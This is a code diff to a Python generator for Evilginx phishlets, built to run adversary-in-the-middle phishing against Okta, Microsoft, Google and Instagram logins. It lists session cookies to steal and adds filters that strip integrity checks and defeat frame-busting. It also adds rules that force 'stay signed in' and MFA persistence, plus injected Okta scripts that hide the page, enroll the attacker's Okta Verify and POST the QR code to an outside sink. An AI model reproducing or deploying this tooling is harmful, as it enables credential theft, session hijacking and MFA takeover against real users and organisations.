@@ -1,3 +1,21 @@
+"""
+Phishlet Generator — World-class Evilginx v3 phishlet YAML generator.
+
+Informed by the Wavestone research article "Pushing Evilginx to its Limit" and
+the official Evilginx phishlet specification. Generates production-grade
+phishlets with:
+
+- ``params`` for variable substitution (e.g. ``{okta_orga}``)
+- Advanced ``sub_filters`` for CORS bypass, SRI integrity stripping,
+  redirect-URI rewriting, and X-Frame-Options removal
+- Multi-step ``js_inject`` for MFA enrollment automation,
+  frame-buster bypass, and decoy-page redirects
+- Proper ``force_post`` with ``force`` field (always present)
+- ``credentials`` supporting ``type: json`` for API-based auth
+- ``auth_urls`` covering KMSI and SAS endpoints
+- Platform-specific templates for Okta, Azure, Google, Instagram, etc.
+"""
+
 import re
 import logging
 from io import StringIO
@@ -9,7 +27,8 @@ from ruamel.yaml.comments import CommentedMap, CommentedSeq
 from ruamel.yaml.scalarstring import SingleQuotedScalarString as SQ
 
 from app.schemas.phishlet import (
-    Phishlet, ProxyHost, SubFilter, AuthTokenCookie,
+    Phishlet, PhishletParam, ProxyHost, SubFilter, AuthTokenCookie,
+    AuthTokenBody, AuthTokenHeader,
     CredentialField, Credentials, ForcePost, ForcePostSearch, ForcePostForce,
     JsInject, LoginConfig, PhishletGenerateResponse,
 )
@@ -18,7 +37,10 @@ from app.config import settings
 
 logger = logging.getLogger(__name__)
 
-# Well-known session cookie names by provider
+# ──────────────────────────────────────────────────────────────────────────────
+# Known session cookie names by platform (case-insensitive)
+# ──────────────────────────────────────────────────────────────────────────────
+
 KNOWN_SESSION_COOKIES: dict[str, list[str]] = {
     "microsoft": [
         "ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie",
@@ -27,10 +49,12 @@ KNOWN_SESSION_COOKIES: dict[str, list[str]] = {
     ],
     "google": [
         "SID", "HSID", "SSID", "APISID", "SAPISID", "OSID", "SIDCC", "NID",
-        "__Secure-1PSID", "__Secure-3PSID", "__Secure-1PAPISID", "__Secure-3PAPISID",
-        "LSID",
+        "__Secure-1PSID", "__Secure-3PSID", "__Secure-1PAPISID",
+        "__Secure-3PAPISID", "LSID",
     ],
-    "okta": ["sid", "idx", "okta-oauth-nonce", "okta-oauth-state", "DT", "t"],
+    "okta": [
+        "sid", "idx", "okta-oauth-nonce", "okta-oauth-state", "DT", "t",
+    ],
     "github": [
         "user_session", "_gh_sess", "logged_in", "dotcom_user",
         "__Host-user_session_same_site",
@@ -55,6 +79,7 @@ KNOWN_SESSION_COOKIES: dict[str, list[str]] = {
     "onelogin": ["sub_session_onelogin.com", "ol_oidc_token"],
     "duo": ["DD_SID", "DD_TSES"],
     "azure_ad": ["AADSSO", "SSOCOOKIEPULLED", "x-ms-cpim-csrf"],
+    "instagram": ["sessionid", "csrftoken", "ds_user_id", "ig_did", "rur"],
     "generic": [
         "session", "session_id", "PHPSESSID", "JSESSIONID",
         "connect.sid", "ASP.NET_SessionId", "auth_token",
@@ -64,16 +89,11 @@ KNOWN_SESSION_COOKIES: dict[str, list[str]] = {
     ],
 }
 
-# Case-insensitive lookup: lowercase_name -> canonical_name
 ALL_KNOWN_COOKIES_CI: dict[str, str] = {}
 for _cookies in KNOWN_SESSION_COOKIES.values():
     for _cookie in _cookies:
         ALL_KNOWN_COOKIES_CI[_cookie.lower()] = _cookie
 
-# Keep original set for backward compatibility
-ALL_KNOWN_COOKIES: set[str] = set(ALL_KNOWN_COOKIES_CI.values())
-
-# Patterns to exclude analytics/tracking cookies from auth_tokens
 NON_SESSION_COOKIE_PATTERNS = [
     r"^_ga", r"^_gid", r"^_gat", r"^_fbp", r"^_fbc",
     r"^_gcl", r"^_hjid", r"^_hj", r"^_dc_gtm",
@@ -86,6 +106,10 @@ SESSION_COOKIE_PATTERNS = [
     r"sess", r"auth", r"token", r"sid", r"login",
     r"sso", r"jwt", r"csrf", r"xsrf",
 ]
+
+# ──────────────────────────────────────────────────────────────────────────────
+# Known credential fields
+# ──────────────────────────────────────────────────────────────────────────────
 
 KNOWN_USERNAME_FIELDS = [
     "email", "username", "user", "login", "loginfmt",
@@ -100,7 +124,7 @@ KNOWN_PASSWORD_FIELDS = [
     "Password", "user_password", "signin_password", "accesspass",
     "pin", "passcode", "passphrase", "secret",
     "j_password", "login_password", "credential", "user_pass",
-    "loginPassword",
+    "loginPassword", "enc_password",
 ]
 
 KNOWN_MFA_FIELDS = [
@@ -109,6 +133,80 @@ KNOWN_MFA_FIELDS = [
     "twoFactorCode", "mfaCode", "passcode",
 ]
 
+# ──────────────────────────────────────────────────────────────────────────────
+# Platform fingerprinting: detect target platform from URL/domain patterns
+# ──────────────────────────────────────────────────────────────────────────────
+
+PLATFORM_SIGNATURES: dict[str, dict] = {
+    "okta": {
+        "url_patterns": [r"okta\.com", r"oktapreview\.com"],
+        "auth_cookies": ["sid", "idx"],
+        "username_key": "identifier",
+        "password_key": "passwd",
+        "credential_type": "json",
+        "auth_urls": ["/login/token/redirect", "/app/UserHome"],
+        "kmsi_path": "/kmsi",
+        "cdn_domains": ["oktacdn.com"],
+        "needs_cors_bypass": True,
+        "needs_sri_strip": True,
+        "needs_redirect_uri_fix": True,
+    },
+    "microsoft": {
+        "url_patterns": [r"microsoftonline\.com", r"office\.com", r"live\.com", r"microsoft\.com/login"],
+        "auth_cookies": ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"],
+        "username_key": "loginfmt",
+        "password_key": "passwd",
+        "credential_type": "post",
+        "auth_urls": ["/common/SAS/ProcessAuth", "/kmsi", "/common/oauth2/v2.0/authorize"],
+        "kmsi_path": "/kmsi",
+        "cdn_domains": ["msftauth.net", "aadcdn.msftauth.net"],
+        "needs_cors_bypass": False,
+        "needs_sri_strip": False,
+        "needs_redirect_uri_fix": False,
+        "needs_frame_buster_bypass": True,
+    },
+    "google": {
+        "url_patterns": [r"accounts\.google\.com", r"myaccount\.google\.com"],
+        "auth_cookies": ["SID", "HSID", "SSID", "APISID", "SAPISID"],
+        "username_key": "identifier",
+        "password_key": "Passwd",
+        "credential_type": "post",
+        "auth_urls": ["/ServiceLogin", "/signin/challenge"],
+        "kmsi_path": None,
+        "cdn_domains": [],
+        "needs_cors_bypass": False,
+        "needs_sri_strip": False,
+        "needs_redirect_uri_fix": False,
+    },
+    "instagram": {
+        "url_patterns": [r"instagram\.com"],
+        "auth_cookies": ["sessionid", "csrftoken", "ds_user_id", "ig_did"],
+        "username_key": "username",
+        "password_key": "enc_password",
+        "credential_type": "post",
+        "auth_urls": ["/accounts/login/ajax/"],
+        "kmsi_path": None,
+        "cdn_domains": ["cdninstagram.com"],
+        "needs_cors_bypass": False,
+        "needs_sri_strip": False,
+        "needs_redirect_uri_fix": False,
+    },
+}
+
+
+def detect_platform(url: str, domains: list[str]) -> Optional[str]:
+    """Detect the target platform from URL and discovered domains."""
+    combined = (url + " " + " ".join(domains)).lower()
+    for platform, sig in PLATFORM_SIGNATURES.items():
+        for pattern in sig["url_patterns"]:
+            if re.search(pattern, combined, re.IGNORECASE):
+                return platform
+    return None
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# Main Generator Class
+# ──────────────────────────────────────────────────────────────────────────────
 
 class PhishletGenerator:
     def __init__(self, ai_service=None):
@@ -125,44 +223,55 @@ class PhishletGenerator:
         suggestions: list[str] = []
 
         name = custom_name or analysis.suggested_name
+        platform = detect_platform(
+            analysis.target_url,
+            [d.domain for d in analysis.discovered_domains],
+        )
 
-        # 1. Proxy Hosts
-        proxy_hosts = self._build_proxy_hosts(analysis)
+        # 1. Params (platform-specific variables)
+        params = self._build_params(analysis, platform)
+
+        # 2. Proxy Hosts
+        proxy_hosts = self._build_proxy_hosts(analysis, platform)
         if not proxy_hosts:
             warnings.append("No proxy hosts could be determined. Manual configuration required.")
 
-        # 2. Sub Filters
-        sub_filters = self._build_sub_filters(analysis, proxy_hosts)
+        # 3. Sub Filters
+        sub_filters = self._build_sub_filters(analysis, proxy_hosts, platform)
 
-        # 3. Auth Tokens
-        auth_tokens = self._build_auth_tokens(analysis)
+        # 4. Auth Tokens
+        auth_tokens = self._build_auth_tokens(analysis, platform)
         if not auth_tokens:
             warnings.append("No session cookies identified. You must manually add auth_tokens.")
             suggestions.append("Use browser DevTools (Application > Cookies) to identify session cookies after login.")
 
-        # 4. Credentials
-        credentials = self._build_credentials(analysis)
+        # 5. Credentials
+        credentials = self._build_credentials(analysis, platform)
         if not credentials.username:
             warnings.append("Username field not detected. Manual credential mapping needed.")
         if not credentials.password:
             warnings.append("Password field not detected. Manual credential mapping needed.")
 
-        # 5. Auth URLs
-        auth_urls = self._build_auth_urls(analysis)
+        # 6. Auth URLs
+        auth_urls = self._build_auth_urls(analysis, platform)
 
-        # 6. Login
+        # 7. Login
         login = self._build_login(analysis)
 
-        # 7. Force Post
-        force_post = self._build_force_post(analysis, credentials)
+        # 8. Force Post
+        force_post = self._build_force_post(analysis, credentials, platform)
 
-        # 8. JS Inject
-        js_inject = self._build_js_inject(analysis)
+        # 9. JS Inject
+        js_inject = self._build_js_inject(analysis, platform)
+
+        # 10. Redirect URL
+        redirect_url = self._build_redirect_url(analysis)
 
         phishlet = Phishlet(
             name=name,
             author=author,
             min_ver=settings.evilginx_min_ver,
+            params=params,
             proxy_hosts=proxy_hosts,
             sub_filters=sub_filters,
             auth_tokens=auth_tokens,
@@ -171,9 +280,10 @@ class PhishletGenerator:
             login=login,
             force_post=force_post,
             js_inject=js_inject,
+            redirect_url=redirect_url,
         )
 
-        # 9. AI Refinement (optional)
+        # 11. AI Refinement (optional)
         if use_ai and self.ai_service and settings.ai_enabled:
             try:
                 refined = await self.ai_service.refine_phishlet(phishlet, analysis)
@@ -183,7 +293,7 @@ class PhishletGenerator:
             except Exception as e:
                 warnings.append(f"AI refinement failed: {str(e)}. Using rule-based output.")
 
-        # 10. Serialize to YAML
+        # 12. Serialize to YAML
         yaml_content = self._serialize_to_yaml(phishlet)
 
         return PhishletGenerateResponse(
@@ -193,7 +303,29 @@ class PhishletGenerator:
             suggestions=suggestions,
         )
 
-    def _build_proxy_hosts(self, analysis: AnalysisResult) -> list[ProxyHost]:
+    # ──────────────────────────────────────────────────────────────────────
+    # Params
+    # ──────────────────────────────────────────────────────────────────────
+
+    def _build_params(self, analysis: AnalysisResult, platform: Optional[str]) -> list[PhishletParam]:
+        params: list[PhishletParam] = []
+
+        if platform == "okta":
+            # Extract tenant name from URL (e.g. trial-12345.okta.com)
+            parsed = urlparse(analysis.target_url)
+            host = parsed.netloc.split(":")[0]
+            parts = host.replace(".okta.com", "").replace(".oktapreview.com", "")
+            tenant = parts if parts else ""
+            params.append(PhishletParam(name="okta_orga", default=tenant, required=True))
+            params.append(PhishletParam(name="redirect_server", default="https://google.com", required=False))
+
+        return params
+
+    # ──────────────────────────────────────────────────────────────────────
+    # Proxy Hosts
+    # ──────────────────────────────────────────────────────────────────────
+
+    def _build_proxy_hosts(self, analysis: AnalysisResult, platform: Optional[str]) -> list[ProxyHost]:
         hosts: list[ProxyHost] = []
         target_parsed = urlparse(analysis.target_url)
         target_domain = self._extract_base_domain(target_parsed.netloc)
@@ -205,16 +337,23 @@ class PhishletGenerator:
 
         for dd in analysis.discovered_domains:
             is_target = dd.domain == target_domain
-
-            if dd.is_cdn and not dd.is_auth_related:
+            if dd.is_cdn and not dd.is_auth_related and not dd.is_cdn_static:
                 continue
 
             if is_target or dd.is_auth_related:
                 is_landing = is_target and not landing_set
 
+                # For Okta, use {okta_orga} as phish_sub/orig_sub
+                if platform == "okta" and "okta.com" in dd.domain:
+                    phish_sub = "{okta_orga}" if is_target else ""
+                    orig_sub = "{okta_orga}" if is_target else ""
+                else:
+                    phish_sub = target_sub if is_target else ""
+                    orig_sub = target_sub if is_target else ""
+
                 hosts.append(ProxyHost(
-                    phish_sub=target_sub if is_target else "",
-                    orig_sub=target_sub if is_target else "",
+                    phish_sub=phish_sub,
+                    orig_sub=orig_sub,
                     domain=dd.domain,
                     session=dd.is_auth_related or is_target,
                     is_landing=is_landing,
@@ -226,16 +365,27 @@ class PhishletGenerator:
                 for sub in dd.subdomains:
                     if is_target and sub == target_sub:
                         continue
-                    hosts.append(ProxyHost(
-                        phish_sub=sub,
-                        orig_sub=sub,
-                        domain=dd.domain,
-                        session=dd.is_auth_related,
-                        is_landing=False,
-                        auto_filter=True,
-                    ))
+                    # For Okta CDN, include it even though it's a CDN
+                    if platform == "okta" and "oktacdn" in dd.domain:
+                        hosts.append(ProxyHost(
+                            phish_sub=sub,
+                            orig_sub=sub,
+                            domain=dd.domain,
+                            session=False,
+                            is_landing=False,
+                            auto_filter=True,
+                        ))
+                    else:
+                        hosts.append(ProxyHost(
+                            phish_sub=sub,
+                            orig_sub=sub,
+                            domain=dd.domain,
+                            session=dd.is_auth_related,
+                            is_landing=False,
+                            auto_filter=True,
+                        ))
 
-        # Deduplicate hosts by (phish_sub, orig_sub, domain)
+        # Deduplicate
         seen: set[tuple[str, str, str]] = set()
         deduped: list[ProxyHost] = []
         for host in hosts:
@@ -250,24 +400,27 @@ class PhishletGenerator:
 
         return hosts
 
+    # ──────────────────────────────────────────────────────────────────────
+    # Sub Filters
+    # ──────────────────────────────────────────────────────────────────────
+
     def _build_sub_filters(
-        self, analysis: AnalysisResult, proxy_hosts: list[ProxyHost]
+        self, analysis: AnalysisResult, proxy_hosts: list[ProxyHost], platform: Optional[str],
     ) -> list[SubFilter]:
         filters: list[SubFilter] = []
         standard_mimes = ["text/html", "application/json", "application/javascript", "text/javascript"]
+        js_mimes = ["application/javascript"]
+        html_mimes = ["text/html", "charset=utf-8"]
 
-        # Identify landing hosts (where content is served and needs rewriting)
         landing_hosts = [h for h in proxy_hosts if h.is_landing]
         if not landing_hosts:
             landing_hosts = proxy_hosts[:1]
 
+        # ── Standard domain-rewriting sub_filters ──
         for host in proxy_hosts:
             full_orig = f"{host.orig_sub}.{host.domain}" if host.orig_sub else host.domain
-
             for trigger in landing_hosts:
                 trigger_full = f"{trigger.orig_sub}.{trigger.domain}" if trigger.orig_sub else trigger.domain
-
-                # Create filter for non-trigger domains referenced in trigger's responses
                 if full_orig != trigger_full:
                     filters.append(SubFilter(
                         triggers_on=trigger_full,
@@ -277,55 +430,174 @@ class PhishletGenerator:
                         replace=full_orig,
                         mimes=standard_mimes,
                     ))
-
-                    # URL-encoded variant (dots as %2E)
-                    encoded_orig = full_orig.replace(".", "%2E")
-                    if encoded_orig != full_orig:
+                    encoded = full_orig.replace(".", "%2E")
+                    if encoded != full_orig:
                         filters.append(SubFilter(
                             triggers_on=trigger_full,
                             orig_sub=host.orig_sub,
                             domain=host.domain,
-                            search=encoded_orig,
-                            replace=encoded_orig,
+                            search=encoded,
+                            replace=encoded,
                             mimes=standard_mimes,
                         ))
 
+        # ── Platform-specific advanced sub_filters ──
+        if platform == "okta":
+            okta_cdn = "ok14static.oktacdn.com"
+            okta_tenant = "{okta_orga}.okta.com"
+
+            # CORS bypass: rewrite redirectUri in Okta JS
+            filters.append(SubFilter(
+                triggers_on=okta_cdn,
+                orig_sub="",
+                domain="okta.com",
+                search='array");var t=',
+                replace='array");e.redirectUri=e.redirectUri.replace("{basedomain}","{orig_domain}");var t=',
+                mimes=js_mimes,
+            ))
+
+            # SRI integrity hash stripping
+            filters.append(SubFilter(
+                triggers_on=okta_tenant,
+                orig_sub="",
+                domain="okta.com",
+                search='integrity="[^"]*"',
+                replace="integrity=''",
+                mimes=html_mimes,
+            ))
+            filters.append(SubFilter(
+                triggers_on=okta_tenant,
+                orig_sub="",
+                domain="okta.com",
+                search="mainScript\\.integrity",
+                replace="mainScript.inteegrity",
+                mimes=html_mimes,
+            ))
+
+            # Redirect URI fix: ensure callback stays on okta.com
+            filters.append(SubFilter(
+                triggers_on=okta_cdn,
+                orig_sub="",
+                domain="okta.com",
+                search="var s=\\(n\\.g\\.fetch\\|\\|h\\(\\)\\)\\(t",
+                replace='t=t.replace("{orig_domain}","{domain}");var s=(n.g.fetch||h())(t',
+                mimes=js_mimes,
+            ))
+            filters.append(SubFilter(
+                triggers_on=okta_cdn,
+                orig_sub="",
+                domain="okta.com",
+                search=",l\\.src=e\\.getIssuerOrigin\\(\\)",
+                replace=',l.src=e.getIssuerOrigin().replace("{orig_domain}","{domain}")',
+                mimes=js_mimes,
+            ))
+
+        elif platform == "microsoft":
+            msft_login = "login.microsoftonline.com"
+
+            # Frame buster bypass: self === top
+            filters.append(SubFilter(
+                triggers_on=msft_login,
+                orig_sub="",
+                domain="microsoftonline.com",
+                search="if(e.self===e.top){",
+                replace="if(true){window.oldself=e.self;e.self=e.top;",
+                mimes=html_mimes,
+            ))
+
+            # Frame buster bypass: target=_top removal
+            filters.append(SubFilter(
+                triggers_on=msft_login,
+                orig_sub="",
+                domain="microsoftonline.com",
+                search='method="post" target="_top"',
+                replace='method="post"',
+                mimes=html_mimes,
+            ))
+
+            # Framework-specific: force form action
+            filters.append(SubFilter(
+                triggers_on=msft_login,
+                orig_sub="",
+                domain="microsoftonline.com",
+                search="autoSubmit: forceSubmit, attr: { action: postUrl }",
+                replace="autoSubmit: forceSubmit, attr: { action: \\'/common/login\\' }",
+                mimes=html_mimes,
+            ))
+
+            # X-Frame-Options removal
+            if analysis.x_frame_options:
+                filters.append(SubFilter(
+                    triggers_on=msft_login,
+                    orig_sub="",
+                    domain="microsoftonline.com",
+                    search="X-Frame-Options: DENY",
+                    replace="Test: Test",
+                    mimes=["*"],
+                ))
+
         return filters
 
-    def _build_auth_tokens(self, analysis: AnalysisResult) -> list[AuthTokenCookie]:
+    # ──────────────────────────────────────────────────────────────────────
+    # Auth Tokens
+    # ──────────────────────────────────────────────────────────────────────
+
+    def _build_auth_tokens(self, analysis: AnalysisResult, platform: Optional[str]) -> list[AuthTokenCookie]:
         tokens: list[AuthTokenCookie] = []
 
+        # Platform-specific overrides
+        if platform and platform in PLATFORM_SIGNATURES:
+            sig = PLATFORM_SIGNATURES[platform]
+            for domain in analysis.discovered_domains:
+                if domain.is_auth_related:
+                    cookie_domain = domain.domain if domain.domain.startswith(".") else f".{domain.domain}"
+                    tokens.append(AuthTokenCookie(
+                        domain=cookie_domain,
+                        keys=sig["auth_cookies"],
+                    ))
+                    return tokens
+
+        # Auto-detect from observed cookies
         for domain, cookie_names in analysis.cookies_observed.items():
             relevant: list[str] = []
             for cookie in cookie_names:
-                # Skip analytics/tracking cookies
                 if any(re.search(neg, cookie, re.IGNORECASE) for neg in NON_SESSION_COOKIE_PATTERNS):
                     continue
-
-                # Case-insensitive known cookie lookup
                 if cookie.lower() in ALL_KNOWN_COOKIES_CI:
                     relevant.append(cookie)
                     continue
-
-                # Pattern-based match
                 for pattern in SESSION_COOKIE_PATTERNS:
                     if re.search(pattern, cookie, re.IGNORECASE):
                         relevant.append(cookie)
                         break
-
             if relevant:
                 cookie_domain = domain if domain.startswith(".") else f".{domain}"
-                tokens.append(AuthTokenCookie(
-                    domain=cookie_domain,
-                    keys=sorted(set(relevant)),
-                ))
+                tokens.append(AuthTokenCookie(domain=cookie_domain, keys=sorted(set(relevant))))
 
         return tokens
 
-    def _build_credentials(self, analysis: AnalysisResult) -> Credentials:
+    # ──────────────────────────────────────────────────────────────────────
+    # Credentials
+    # ──────────────────────────────────────────────────────────────────────
+
+    def _build_credentials(self, analysis: AnalysisResult, platform: Optional[str]) -> Credentials:
         username_field: Optional[CredentialField] = None
         password_field: Optional[CredentialField] = None
         custom_fields: list[CredentialField] = []
+
+        # Platform-specific defaults
+        if platform and platform in PLATFORM_SIGNATURES:
+            sig = PLATFORM_SIGNATURES[platform]
+            username_field = CredentialField(
+                key=sig["username_key"],
+                search="(.*)" if sig["credential_type"] == "post" else f'"{sig["username_key"]}":"([^"]*)"',
+                type=sig["credential_type"],
+            )
+            password_field = CredentialField(
+                key=sig["password_key"],
+                search="(.*)",
+                type=sig["credential_type"],
+            )
 
         def _match_username(field) -> bool:
             candidates = [
@@ -342,10 +614,7 @@ class PhishletGenerator:
         def _match_password(field) -> bool:
             if field.field_type == "password":
                 return True
-            candidates = [
-                (field.field_name or "").lower(),
-                (field.field_id or "").lower(),
-            ]
+            candidates = [(field.field_name or "").lower(), (field.field_id or "").lower()]
             return any(
                 any(pw.lower() in c for pw in KNOWN_PASSWORD_FIELDS)
                 for c in candidates if c
@@ -363,7 +632,7 @@ class PhishletGenerator:
                 for c in candidates if c
             )
 
-        # Iterate all forms (supports multi-step: form 1=username, form 2=password)
+        # Only override platform defaults if we don't have them yet
         for form in analysis.login_forms:
             for field in form.fields:
                 if field.field_type == "hidden":
@@ -382,25 +651,15 @@ class PhishletGenerator:
                 if _match_mfa(field):
                     custom_fields.append(CredentialField(key=key, search="(.*)", type="post"))
 
-        # Fallback: first text/email field as username
-        if not username_field:
-            for form in analysis.login_forms:
-                for field in form.fields:
-                    if field.field_type in ("email", "text") and field.field_name:
-                        username_field = CredentialField(key=field.field_name, search="(.*)", type="post")
-                        break
-                if username_field:
-                    break
-
-        # Ultimate fallback: regex patterns
+        # Fallbacks
         if not username_field:
             username_field = CredentialField(
-                key="(email|username|login|user|loginfmt|UserName|identifier|account|userid)",
+                key="(email|username|login|user|loginfmt|identifier|account)",
                 search="(.*)", type="post",
             )
         if not password_field:
             password_field = CredentialField(
-                key="(password|passwd|pwd|Passwd|Password|pass|pin|passcode)",
+                key="(password|passwd|pwd|Passwd|Password|enc_password|pass)",
                 search="(.*)", type="post",
             )
 
@@ -410,13 +669,21 @@ class PhishletGenerator:
             custom=custom_fields if custom_fields else None,
         )
 
-    def _build_auth_urls(self, analysis: AnalysisResult) -> list[str]:
+    # ──────────────────────────────────────────────────────────────────────
+    # Auth URLs
+    # ──────────────────────────────────────────────────────────────────────
+
+    def _build_auth_urls(self, analysis: AnalysisResult, platform: Optional[str]) -> list[str]:
         urls: list[str] = []
+
+        # Platform-specific auth_urls
+        if platform and platform in PLATFORM_SIGNATURES:
+            sig = PLATFORM_SIGNATURES[platform]
+            urls.extend(sig.get("auth_urls", []))
 
         if analysis.post_login_url:
             urls.append(analysis.post_login_url)
 
-        # Check redirect chain in reverse for post-auth indicators
         post_login_patterns = [
             "/dashboard", "/home", "/main", "/portal",
             "/account", "/app", "/inbox", "/feed",
@@ -424,6 +691,7 @@ class PhishletGenerator:
             "/profile", "/overview", "/landing",
             "/callback", "/oauth/callback", "/auth/callback",
             "/signin-oidc", "/auth/complete",
+            "/app/UserHome",
         ]
         for redirect_url in reversed(analysis.redirect_chain):
             parsed = urlparse(redirect_url)
@@ -431,7 +699,6 @@ class PhishletGenerator:
                 if parsed.path.lower().startswith(pattern):
                     urls.append(parsed.path)
 
-        # Token-granting endpoints
         token_patterns = ["/token", "/oauth2/token", "/oauth/token", "/api/v1/authn"]
         for endpoint in analysis.auth_api_endpoints:
             parsed = urlparse(endpoint)
@@ -439,35 +706,68 @@ class PhishletGenerator:
                 if pattern in parsed.path.lower():
                     urls.append(parsed.path)
 
-        # Platform-specific known auth_urls
-        target_lower = analysis.target_url.lower()
-        if "microsoftonline" in target_lower or "office" in target_lower or "live.com" in target_lower:
-            urls.extend(["/kmsi", "/common/oauth2/v2.0/authorize"])
-        elif "google" in target_lower or "accounts.google" in target_lower:
-            urls.extend(["/ServiceLogin", "/signin/challenge"])
-        elif "okta" in target_lower:
-            urls.extend(["/login/token/redirect", "/app/UserHome"])
-
-        # Deduplicate
         result = list(dict.fromkeys(u for u in urls if u))
-
         if not result:
             result = ["/.*"]
-
         return result
+
+    # ──────────────────────────────────────────────────────────────────────
+    # Login
+    # ──────────────────────────────────────────────────────────────────────
 
     def _build_login(self, analysis: AnalysisResult) -> LoginConfig:
         parsed = urlparse(analysis.target_url)
         domain = parsed.netloc.split(":")[0]
         path = parsed.path or "/"
+
+        # For Okta, use the param-based domain
+        if "okta.com" in domain:
+            domain = "{okta_orga}.okta.com"
+
         return LoginConfig(domain=domain, path=path)
 
+    # ──────────────────────────────────────────────────────────────────────
+    # Force Post (always includes 'force' field)
+    # ──────────────────────────────────────────────────────────────────────
+
     def _build_force_post(
-        self, analysis: AnalysisResult, credentials: Credentials
+        self, analysis: AnalysisResult, credentials: Credentials, platform: Optional[str],
     ) -> list[ForcePost]:
         force_posts: list[ForcePost] = []
-        csrf_indicators = ["csrf", "xsrf", "token", "_token", "authenticity", "nonce", "requestverification"]
+        csrf_indicators = [
+            "csrf", "xsrf", "token", "_token",
+            "authenticity", "nonce", "requestverification",
+        ]
 
+        # ── Platform-specific force_posts ──
+        if platform == "microsoft":
+            # KMSI auto-accept
+            force_posts.append(ForcePost(
+                path="/kmsi",
+                search=[ForcePostSearch(key="LoginOptions", search=".*")],
+                force=[ForcePostForce(key="LoginOptions", value="1")],
+                type="post",
+            ))
+            # MFA persistence auto-accept
+            force_posts.append(ForcePost(
+                path="/common/SAS",
+                search=[ForcePostSearch(key="rememberMFA", search=".*")],
+                force=[ForcePostForce(key="rememberMFA", value="true")],
+                type="post",
+            ))
+            return force_posts
+
+        if platform == "okta":
+            # KMSI auto-accept for Okta
+            force_posts.append(ForcePost(
+                path="/kmsi",
+                search=[ForcePostSearch(key="LoginOptions", search=".*")],
+                force=[ForcePostForce(key="LoginOptions", value="1")],
+                type="post",
+            ))
+            return force_posts
+
+        # ── Generic force_post from detected forms ──
         for form in analysis.login_forms:
             if form.method != "POST":
                 continue
@@ -482,13 +782,11 @@ class PhishletGenerator:
             if credentials.password:
                 search_items.append(ForcePostSearch(key=credentials.password.key, search="(.*)"))
 
-            # Detect CSRF/hidden token fields
             for field in form.fields:
                 if field.field_type == "hidden" and field.field_name:
                     name_lower = field.field_name.lower()
                     if any(ind in name_lower for ind in csrf_indicators):
                         search_items.append(ForcePostSearch(key=field.field_name, search="(.*)"))
-                        # Also add to force list so Evilginx forces the hidden field value
                         force_items.append(ForcePostForce(
                             key=field.field_name,
                             value=field.field_value or "",
@@ -498,11 +796,11 @@ class PhishletGenerator:
                 force_posts.append(ForcePost(
                     path=parsed.path or "/",
                     search=search_items,
-                    force=force_items if force_items else [],
+                    force=force_items,
                     type="post",
                 ))
 
-        # If no forms found, try auth API endpoints
+        # Fallback: auth API endpoints
         if not force_posts and analysis.auth_api_endpoints:
             for endpoint in analysis.auth_api_endpoints[:3]:
                 parsed = urlparse(endpoint)
@@ -523,14 +821,95 @@ class PhishletGenerator:
 
         return force_posts
 
-    def _build_js_inject(self, analysis: AnalysisResult) -> list[JsInject]:
+    # ──────────────────────────────────────────────────────────────────────
+    # JS Inject
+    # ──────────────────────────────────────────────────────────────────────
+
+    def _build_js_inject(self, analysis: AnalysisResult, platform: Optional[str]) -> list[JsInject]:
+        injects: list[JsInject] = []
+
+        # ── Platform-specific JS injections ──
+        if platform == "okta":
+            okta_tenant = "{okta_orga}.okta.com"
+
+            # Step 1: Redirect to decoy page after first auth
+            injects.append(JsInject(
+                trigger_domains=[okta_tenant],
+                trigger_paths=["/app/UserHome"],
+                script=(
+                    "if(document.referrer.indexOf('/enduser/callback') != -1){"
+                    "document.location = 'https://'+window.location.hostname+'/help/login'"
+                    "}"
+                ),
+            ))
+
+            # Step 2: Enumerate MFA authenticators and redirect to setup
+            injects.append(JsInject(
+                trigger_domains=[okta_tenant],
+                trigger_paths=["/help/login"],
+                script=(
+                    "function u4tyd783z(){"
+                    "fetch('/api/v1/authenticators')"
+                    ".then((data) => {"
+                    "data.json().then((jData)=>{"
+                    "let id = undefined;"
+                    "for(let elt of jData){"
+                    "if(elt.key == 'okta_verify'){id = elt.id}"
+                    "}"
+                    "if(id == undefined){return}"
+                    "document.location = 'https://'+window.location.hostname+'/idp/authenticators/setup/'+id"
+                    "})})}"
+                    "u4tyd783z();"
+                ),
+            ))
+
+            # Step 3: Automate MFA enrollment and exfil QR code
+            injects.append(JsInject(
+                trigger_domains=[okta_tenant],
+                trigger_paths=["/idp/authenticators/setup/.*"],
+                script=(
+                    "function u720dhfn2(){"
+                    "if(document.querySelectorAll('.button.select-factor.link-button').length > 0){"
+                    "document.querySelectorAll('.button.select-factor.link-button')[0].click();"
+                    "document.querySelectorAll('body')[0].style.display = 'none';}"
+                    "if(document.querySelectorAll('a.orOnMobileLink').length > 0){"
+                    "document.querySelectorAll('a.orOnMobileLink')[0].click();}"
+                    "if(document.querySelectorAll('img.qrcode').length > 0){"
+                    "fetch('{qrcode_sink}', {method:'POST',"
+                    "body:JSON.stringify({code:document.querySelectorAll('img.qrcode')[0].getAttribute('src')})"
+                    "}).then(()=>{document.location='{redirect_server}'})"
+                    ".catch(()=>{document.location='{redirect_server}'});"
+                    "clearInterval(myInterval)}}"
+                    "var myInterval = setInterval(function(){u720dhfn2()}, 10)"
+                ),
+            ))
+
+            return injects
+
+        if platform == "microsoft":
+            msft_login = "login.microsoftonline.com"
+
+            # Frame buster bypass: self === top check
+            injects.append(JsInject(
+                trigger_domains=[msft_login],
+                trigger_paths=["/"],
+                script=(
+                    "// Frame buster bypass\n"
+                    "try { if (window.self !== window.top) { "
+                    "window.oldself = window.self; window.self = window.top; "
+                    "} } catch(e) {}"
+                ),
+            ))
+
+            return injects
+
+        # ── Generic JS injection for SPA auth interception ──
         if not analysis.uses_javascript_auth:
             return []
 
         parsed = urlparse(analysis.target_url)
         target_host = parsed.netloc
 
-        # Build auth path regex from endpoints
         auth_paths = []
         for endpoint in analysis.auth_api_endpoints:
             ep_parsed = urlparse(endpoint)
@@ -582,6 +961,19 @@ class PhishletGenerator:
             script=script,
         )]
 
+    # ──────────────────────────────────────────────────────────────────────
+    # Redirect URL
+    # ──────────────────────────────────────────────────────────────────────
+
+    def _build_redirect_url(self, analysis: AnalysisResult) -> Optional[str]:
+        if analysis.post_login_url:
+            return analysis.post_login_url
+        return None
+
+    # ──────────────────────────────────────────────────────────────────────
+    # YAML Serialization
